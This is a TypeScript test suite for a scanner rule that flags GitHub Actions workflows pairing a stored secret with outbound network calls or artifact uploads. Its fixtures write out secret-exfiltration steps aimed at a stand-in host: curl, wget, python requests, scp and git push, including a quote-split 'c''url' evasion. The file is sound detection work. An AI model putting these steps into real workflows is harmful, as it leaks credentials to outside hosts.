/**
 * WORKFLOW_SECRET_TO_UPLOAD_PATH is a whole-file check: a stored secret (not
 * the run's own token, not a presence test) and, in the same workflow, an
 * outbound call in executed text or an artifact upload. It used to match any
 * `secrets.` text and any `curl`/`fetch`/`https://` text anywhere, so comments,
 * `fetch-depth:`, `with:` URLs and loopback health checks were reported.
 */

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import * as os from "node:os";
import { modelWorkflows } from "../workflow-modeler.js";
import { performanceBudget } from "./performance-budget.js";

const RULE = "WORKFLOW_SECRET_TO_UPLOAD_PATH";

let dir: string;
beforeEach(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), "scg-wf-egress-"));
});
afterEach(() => {
  fs.rmSync(dir, { recursive: true, force: true });
});

function write(rel: string, lines: string[]): void {
  const full = path.join(dir, rel);
  fs.mkdirSync(path.dirname(full), { recursive: true });
  fs.writeFileSync(full, lines.join("\n"));
}

function workflow(lines: string[], name = "ci.yml"): void {
  write(`.github/workflows/${name}`, lines);
}

function files(): string[] {
  return modelWorkflows(dir)
    .filter((f) => f.rule === RULE)
    .map((f) => f.file!);
}

const HEAD = ["name: CI", "on: push", "jobs:", "  build:", "    runs-on: ubuntu-latest", "    steps:"];

describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: a stored secret and egress in one workflow", () => {
  it.each([
    ["an env secret and a curl", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', '        run: curl -d "$T" https://x.example']],
    ["a secret in the run body", ['      - run: curl -d "${{ secrets.NPM_TOKEN }}" https://x.example']],
    ["bracket access", ["      - env:", "          T: ${{ secrets['NPM_TOKEN'] }}", '        run: wget --post-data "$T" https://x.example']],
    ["the whole secrets context", ["      - env:", "          ALL: ${{ toJSON(secrets) }}", "        run: echo ok"], "      - uses: actions/upload-artifact@v4"],
    ["an artifact upload", ["      - env: { T: \"${{ secrets.NPM_TOKEN }}\" }", '        run: echo "$T" > k.txt', "      - uses: actions/upload-artifact@v4", "        with:", "          path: k.txt"]],
    ["ssh with a deploy key", ['      - env: { KEY: "${{ secrets.SSH_PRIVATE_KEY }}" }', '        run: echo "$KEY" > k && ssh -i k deploy@x.example ./deploy.sh']],
    ["scp to a remote host", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: scp out.txt user@x.example:/tmp/"]],
    ["python requests", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', `        run: python3 -c "import requests; requests.post('https://x.example', data='x')"`]],
    ["git push to a remote that is not GitHub", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: git push https://x.example/r.git HEAD"]],
    ["a tool name split by quoting", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: c''url -d \"$T\" https://x.example"]],
  ] as Array<[string, string[], string?]>)("reports %s", (_label, steps, extra) => {
    workflow([...HEAD, ...steps, ...(extra ? [extra] : [])]);
    expect(files()).toEqual([".github/workflows/ci.yml"]);
  });

  it("reports a workflow-level env secret with a curl in another job", () => {
    workflow([
      "name: CI",
      "on: push",
      "env:",
      "  T: ${{ secrets.NPM_TOKEN }}",
      "jobs:",
      "  build:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      '      - run: curl -H "Authorization: $T" https://x.example',
    ]);
    expect(files()).toEqual([".github/workflows/ci.yml"]);
  });
});

describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: what is not a stored secret or not egress", () => {
  it.each([
    ["no secret", ["      - run: curl https://x.example/health"]],
    ["only the run's own token", ['      - env: { T: "${{ secrets.GITHUB_TOKEN }}" }', '        run: curl -H "Authorization: $T" https://api.x.example']],
    ["github.token", ['      - env: { T: "${{ github.token }}" }', '        run: curl -H "Authorization: $T" https://api.x.example']],
    ["a secret only tested for presence", ["      - if: ${{ secrets.DEPLOY_KEY != '' }}", "        run: curl https://x.example/health"]],
    ["loopback calls only", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: curl http://127.0.0.1:8080/health && wget -q localhost:3000"]],
    ["git fetch and fetch-depth", ["      - uses: actions/checkout@v4", "        with:", "          fetch-depth: 0", '      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: git fetch origin main"]],
    ["curl in a shell comment inside the run block", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: |", "          npm publish", "          # curl -d \"$T\" https://x.example", "          echo done # wget https://x.example"]],
    ["a tool name outside executed text", ['      - name: curl the health endpoint after the build', '        env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: npm run build"]],
    ["a URL outside executed text", ["      - uses: some-org/deploy@0123456789abcdef0123456789abcdef01234567", "        with:", "          url: https://x.example", "          token: ${{ secrets.NPM_TOKEN }}"]],
    ["ssh-keygen and ssh to loopback", ['      - env: { KEY: "${{ secrets.SSH_PRIVATE_KEY }}" }', "        run: ssh-keygen -R x.example && ssh -p 2222 git@127.0.0.1 true"]],
    ["gh api", ['      - env: { GH_TOKEN: "${{ secrets.RELEASE_PAT }}" }', "        run: gh api repos/o/r/releases"]],
  ])("does not report %s", (_label, steps) => {
    workflow([...HEAD, ...steps]);
    expect(files()).toEqual([]);
  });
});

describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: each file on its own", () => {
  it("keeps scanning the files after one it cannot classify", () => {
    // A huge first file must not end the loop for the ones after it.
    workflow([...HEAD, "      - run: " + "a;".repeat(200_000)], "a-lint.yml");
    workflow([...HEAD, '      - run: curl -d "${{ secrets.NPM_TOKEN }}" https://x.example'], "b-exfil.yml");
    expect(files()).toEqual([".github/workflows/b-exfil.yml"]);
  });
});

describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: linear on 5 MiB input", () => {
  const FIVE_MIB = 5 * 1024 * 1024;

  function timed(lines: string[]): number {
    workflow(lines);
    const started = performance.now();
    modelWorkflows(dir);
    return performance.now() - started;
  }

  it.each([
    ["unclosed expressions", () => [...HEAD, "      - env:", `          T: ${"${{ secrets ".repeat(Math.ceil(FIVE_MIB / 12))}`, "        run: curl https://x.example"]],
    ["fetch( without a literal", () => [...HEAD, '      - env: { T: "${{ secrets.X }}" }', `        run: ${"fetch( ".repeat(Math.ceil(FIVE_MIB / 7))}`]],
    ["one long curl line of loopback targets", () => [...HEAD, '      - env: { T: "${{ secrets.X }}" }', `        run: curl ${"localhost ".repeat(Math.ceil(FIVE_MIB / 10))}`]],
    ["a run of quotes", () => [...HEAD, '      - env: { T: "${{ secrets.X }}" }', `        run: curl -H ${'"'.repeat(FIVE_MIB)}`]],
    ["scp words that never name a remote", () => [...HEAD, '      - env: { T: "${{ secrets.X }}" }', `        run: scp ${"a@a@a@a@a.b.c.d.e.f.g.h.i ".repeat(Math.ceil(FIVE_MIB / 26))}`]],
    ["ssh options", () => [...HEAD, '      - env: { T: "${{ secrets.X }}" }', `        run: ssh ${"-o X ".repeat(Math.ceil(FIVE_MIB / 5))}`]],
    ["quoted command names", () => [...HEAD, '      - env: { T: "${{ secrets.X }}" }', `        run: ${"c''u\"r\"l ".repeat(Math.ceil(FIVE_MIB / 10))}`]],
    ["git push words", () => [...HEAD, '      - env: { T: "${{ secrets.X }}" }', `        run: git push ${"a@b.c:d ".repeat(Math.ceil(FIVE_MIB / 8))}`]],
    ["presence tests", () => [...HEAD, `      - run: echo "${"${{ secrets.X != '' }} ".repeat(Math.ceil(FIVE_MIB / 26))}"`]],
  ] as Array<[string, () => string[]]>)("%s", { timeout: performanceBudget(60_000) }, (_label, build) => {
    expect(timed(build())).toBeLessThan(performanceBudget(15_000));
  });
});
